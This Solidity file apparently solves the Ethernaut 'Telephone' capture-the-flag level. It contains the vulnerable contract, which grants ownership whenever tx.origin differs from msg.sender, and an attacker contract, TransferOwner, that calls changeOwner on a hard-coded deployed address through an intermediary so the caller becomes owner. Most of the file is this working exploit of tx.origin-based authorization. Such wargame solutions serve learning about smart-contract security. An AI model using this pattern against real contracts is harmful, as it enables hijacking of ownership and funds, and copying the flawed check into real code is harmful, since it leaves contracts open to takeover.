// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TransferOwner {
    Telephone tel;
    address telAddress = 0xc5F8b1Cda90D0E74af3392f90e143203b66a22Fb;
    
    constructor() {
        tel = Telephone(telAddress);
    }
    
    function transferToMe() external {
        tel.changeOwner(msg.sender);
    }
}
